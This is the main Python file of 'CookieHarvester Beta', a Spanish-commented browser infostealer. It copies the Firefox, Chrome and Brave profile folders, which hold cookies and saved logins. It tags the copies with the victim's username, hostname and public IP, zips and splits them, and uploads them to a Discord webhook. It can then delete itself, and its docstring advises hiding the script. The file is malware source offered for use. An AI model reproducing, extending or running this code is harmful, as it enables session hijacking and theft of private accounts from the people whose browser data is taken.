#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CookieHarvester Beta
- Desarrollado por Bankai-HackingDev.
- Usado y testeado en Linux Mint 22.3 y Fedora 44 KDE.
- Eficaz contra navegadores por defecto como Firefox.
- Funcion experimental para navegadores Chromiun.
- El script es funcional, se recomienda esconderlo y llamarlo desde otro lugar.
"""

# ============================================================
#                    IMPORTS
# ============================================================
import os
import sys
import time
import socket
import getpass
import glob
import tempfile
import traceback
from datetime import datetime
import shutil

# Configuración global y verificación de requests.
from config import (
    VERSION,
    DISCORD_WEBHOOK_URL,
    MAX_SIZE_MB,
    AUTODESTRUIR,
    SOPORTE_CHROME,
    REQUESTS_DISPONIBLE,
    Requests_NOT,
)

# Si requests no está disponible, importamos requests igualmente
# para los chequeos de main (requests.get). El original lo hacía así.
if REQUESTS_DISPONIBLE:
    import requests
else:
    # Si no está, dejamos un stub para que el flujo llegue a Requests_NOT
    # y se autodestruya correctamente.
    requests = None

# Lógica de negocio.
from core.navegadores import detectar_navegadores_abiertos
from core.perfiles import (
    encontrar_perfil_firefox,
    encontrar_perfil_chrome,
    encontrar_perfil_brave,
)
from core.copia import copiar_carpeta
from core.info import crear_info_txt
from core.compresion import crear_zip_desde_carpeta, dividir_zip_en_partes
from core.limpieza import autodestruir_seguro

# Transporte.
from transport import get_transport


# ============================================================
# Procesa un perfil completo (copia, comprime, envía)
# Muestra errores de copia si ocurren.
# ============================================================
def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica,
                    navegadores_abiertos, transport):
    """
    Procesa un perfil de navegador:
    1. Copia la carpeta del perfil
    2. Añade info.txt
    3. Comprime en ZIP
    4. Divide y envía a Discord
    Retorna True si todas las partes se enviaron correctamente.
    """
    print(f"\n[DEBUG] === PROCESAR_PERFIL: {nombre_navegador} ===")
    print(f"[DEBUG] Ruta del perfil: {perfil_path}")

    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    print(f"[DEBUG] Carpeta de copia: {carpeta_copia}")

    if not copiar_carpeta(perfil_path, carpeta_copia):
        print(f"[!] Error al copiar perfil de {nombre_navegador}")
        return False

    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, VERSION, navegadores_abiertos, nombre_navegador)

    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = (
        f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_"
        f"{socket.gethostname()}_{fecha}_{nombre_navegador}"
    )
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    print(f"[DEBUG] ZIP creado en: {zip_path}")

    crear_zip_desde_carpeta(carpeta_copia, zip_path)
    print(f"[DEBUG] Tamaño del ZIP: {os.path.getsize(zip_path)} bytes")

    parts = dividir_zip_en_partes(zip_path, MAX_SIZE_MB)
    print(f"[DEBUG] Partes generadas: {len(parts)}")

    exitos = 0
    for idx, part in enumerate(parts, 1):
        print(f"\n[DEBUG] --- Enviando parte {idx}/{len(parts)} ---")
        caption = f"📁 **{nombre_navegador}** - Parte {idx}/{len(parts)} | {nombre_base}"
        if transport.send_file(part, caption):
            exitos += 1
            print(f"[DEBUG] Parte {idx} enviada correctamente")
        else:
            print(f"[DEBUG] Parte {idx} falló")
        time.sleep(1)

    resultado = exitos == len(parts)
    print(f"[DEBUG] Resultado final para {nombre_navegador}: {'Éxito' if resultado else 'Falló'}")
    return resultado


# ============================================================
# Verifica que todas las funciones necesarias existan.
# Muestra error si falta alguna función.
# ============================================================
def verificar_funciones():
    """Verifica que todas las funciones necesarias estén definidas."""
    funciones_requeridas = [
        'procesar_perfil',
        'copiar_carpeta',
        'crear_info_txt',
        'crear_zip_desde_carpeta',
        'dividir_zip_en_partes',
        'enviar_a_discord',
        'enviar_resumen_final',
    ]

    for func in funciones_requeridas:
        if func not in globals():
            print(f"[!] Error: La función '{func}' no está definida.")
            return False
    return True


# ============================================================
#                     FUNCIÓN PRINCIPAL
# ============================================================
def main():
    print("\n[DEBUG] === INICIO DE MAIN ===")

    # ============================================================
    # AUTODESTRUCCIÓN si no existe Requests.
    # ============================================================
    script_path = os.path.abspath(__file__)
    print(f"[DEBUG] script_path: {script_path}")
    print(f"[DEBUG] REQUESTS_DISPONIBLE: {REQUESTS_DISPONIBLE}")

    # Verificar que requests realmente funciona.
    try:
        print("[DEBUG] Probando requests.get()...")
        test_response = requests.get('https://api.ipify.org', timeout=3)
        print(f"[DEBUG] requests.get() funciona. IP test: {test_response.text[:20]}")
    except Exception as e:
        print(f"[!] ERROR: requests.get() NO funciona: {e}")
        traceback.print_exc()

    if not Requests_NOT(False, None, script_path):
        print("[DEBUG] Requests_NOT retornó False (requests disponible) -> continuando")
        pass
    else:
        print("[DEBUG] Requests_NOT retornó True (requests NO disponible) -> saliendo")
        sys.exit(1)

    # Verificar funciones requeridas.
    if not verificar_funciones():
        print("[DEBUG] verificar_funciones falló")
        sys.exit(1)
    print("[DEBUG] verificar_funciones OK")

    # ===================================================================================
    # INICIO DEL SCRIPT
    # ESTO SE MUESTRA EN CONSOLA, elimine los print si quiere.
    # ===================================================================================
    print("=" * 60)
    print(f"  CookieHarvester {VERSION}  ")
    print("=" * 60)

    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")

    # Obtener IP pública.
    try:
        print("[DEBUG] Obteniendo IP pública...")
        ip_publica = requests.get('https://api.ipify.org', timeout=5).text
        print(f"[+] IP Pública: {ip_publica}")
        print(f"[DEBUG] IP obtenida: {ip_publica}")
    except Exception as e:
        ip_publica = "No disponible"
        print("[+] IP Pública: No disponible")
        print(f"[!] Error obteniendo IP: {e}")

    # Detectar navegadores abiertos.
    print("[DEBUG] Detectando navegadores abiertos...")
    abiertos = detectar_navegadores_abiertos()
    print(f"[DEBUG] Navegadores abiertos: {abiertos}")
    if abiertos:
        print(f"Navegadores ABIERTOS: {', '.join(abiertos)}")
    else:
        print("No hay navegadores abiertos.")

    # Crear directorio temporal.
    temp_dir = tempfile.mkdtemp(prefix="c4_")
    print(f"[+] Directorio temporal: {temp_dir}")
    print(f"[DEBUG] temp_dir creado: {temp_dir}")

    # ============================================================
    # BUSCAR PERFILES
    # ============================================================
    print("[DEBUG] Buscando perfiles...")
    perfiles = []
    firefox_path = encontrar_perfil_firefox()
    if firefox_path:
        perfiles.append((firefox_path, "Firefox"))
        print(f"[DEBUG] Firefox encontrado en: {firefox_path}")

    if SOPORTE_CHROME:
        chrome_path = encontrar_perfil_chrome()
        if chrome_path:
            perfiles.append((chrome_path, "Chrome"))
            print(f"[DEBUG] Chrome encontrado en: {chrome_path}")
        brave_path = encontrar_perfil_brave()
        if brave_path:
            perfiles.append((brave_path, "Brave"))
            print(f"[DEBUG] Brave encontrado en: {brave_path}")

    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        print("[DEBUG] Saliendo por falta de perfiles")
        sys.exit(1)

    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")

    # ============================================================
    # ENVÍO De inicio a Discord
    # ============================================================
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[DEBUG] Fecha/hora: {fecha}")

    print("\n[*] Enviando mensajes de confirmación a Discord...")

    perfiles_procesados = []
    total_partes_enviadas = 0
    errores_globales = False

    # Instanciamos el transporte.
    transport = get_transport()

    print(f"\n [*] Enviando info de nuevo objetivo por {type(transport).__name__}")

    info_exitoso = transport.info_objetivo(
        VERSION=VERSION,
        usuario=usuario,
        equipo=equipo,
        ip_publica=ip_publica,
        fecha=fecha,
        errores=errores_globales
    )
    print(f"    Mensaje 'objetivo nuevo': {'Enviado' if info_exitoso else 'Falló'}")
    print(f"[DEBUG] info_exitoso = {info_exitoso}")

    # ============================================================
    # PROCESAR CADA PERFIL
    # ============================================================
    for perfil_path, nombre in perfiles:
        print(f"\n[*] Procesando: {nombre}")
        print(f"[DEBUG] Procesando perfil: {nombre} en {perfil_path}")
        exito = procesar_perfil(
            perfil_path, nombre, temp_dir, ip_publica, abiertos, transport
        )
        print(f"[DEBUG] Resultado de procesar_perfil para {nombre}: {exito}")

        fecha_zip = datetime.now().strftime('%Y-%m-%d')
        nombre_base = f"{ip_publica.replace('.', '_')}_{usuario}_{equipo}_{fecha_zip}_{nombre}"
        zip_base = os.path.join(temp_dir, f"{nombre_base}.zip")
        print(f"[DEBUG] zip_base esperado: {zip_base}")

        partes = 1
        if os.path.exists(zip_base):
            print(f"[DEBUG] zip_base existe")
            parte_idx = 1
            while os.path.exists(os.path.join(temp_dir, f"{nombre_base}_part{parte_idx+1}.zip")):
                parte_idx += 1
            partes = parte_idx if parte_idx > 1 else 1
            print(f"[DEBUG] partes contadas desde zip_base: {partes}")
        else:
            print(f"[DEBUG] zip_base NO existe, buscando por glob...")
            partes_encontradas = glob.glob(os.path.join(temp_dir, f"{nombre_base}_part*.zip"))
            if partes_encontradas:
                partes = len(partes_encontradas)
                print(f"[DEBUG] partes encontradas por glob: {partes}")
            else:
                partes = 1
                print(f"[DEBUG] partes por defecto: 1")

        if exito:
            print(f"[+] {nombre} procesado correctamente.")
        else:
            print(f"[!] {nombre} tuvo errores.")
            errores_globales = True

        perfiles_procesados.append({
            'nombre': nombre,
            'partes': partes
        })
        total_partes_enviadas += partes
        print(f"[DEBUG] total_partes_enviadas acumulado: {total_partes_enviadas}")

    print(f"\n[DEBUG] perfiles_procesados final: {perfiles_procesados}")
    print(f"[DEBUG] errores_globales: {errores_globales}")

    # ============================================================
    # Enviar resumen final a Discord
    # ============================================================
    info_objetivo_dict = {
        'usuario': usuario,
        'equipo': equipo,
        'ip_publica': ip_publica,
        'fecha': fecha
    }
    print(f"[DEBUG] info_objetivo_dict: {info_objetivo_dict}")

    resumen_exitoso = transport.enviar_resumen_final(
        info_objetivo_dict=info_objetivo_dict,
        perfiles_procesados=perfiles_procesados,
        total_partes_enviadas=total_partes_enviadas,
        errores=errores_globales
    )
    print(f"    Resumen final: {'Enviado' if resumen_exitoso else 'Falló'}")
    print(f"[DEBUG] resumen_exitoso = {resumen_exitoso}")

    # ============================================================
    # LIMPIEZA Y AUTODESTRUCCIÓN (SOLO DESPUÉS DE CONFIRMAR ENVÍOS)
    # ============================================================
    print("\n[DEBUG] === AUTODESTRUCCION ===")
    print(f"[DEBUG] info_exitoso: {info_exitoso}")
    print(f"[DEBUG] resumen_exitoso: {resumen_exitoso}")
    print(f"[DEBUG] perfiles_procesados: {len(perfiles_procesados)}")
    print(f"[DEBUG] total_partes_enviadas: {total_partes_enviadas}")
    print(f"[DEBUG] errores_globales: {errores_globales}")
    print(f"[DEBUG] AUTODESTRUIR: {AUTODESTRUIR}")

    if AUTODESTRUIR:
        mensajes_enviados = {
            'objetivo_nuevo': info_exitoso,
            'resumen_final': resumen_exitoso
        }
        print(f"[DEBUG] mensajes_enviados: {mensajes_enviados}")

        autodestruir_seguro(temp_dir, os.path.abspath(__file__), mensajes_enviados)
    else:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        print("\n[+] Limpieza completada.")
        print("=" * 60)


if __name__ == "__main__":
    main()